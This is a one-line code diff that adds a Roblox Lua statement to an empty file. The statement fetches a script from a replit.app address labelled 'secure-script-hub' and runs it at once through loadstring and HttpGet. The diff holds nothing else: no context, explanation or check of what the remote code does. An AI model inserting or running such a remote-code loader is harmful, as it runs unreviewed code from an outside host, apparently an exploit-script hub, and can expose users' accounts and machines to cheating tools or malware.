@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://secure-script-hub--fass509ami.replit.app/raw/Q"))()
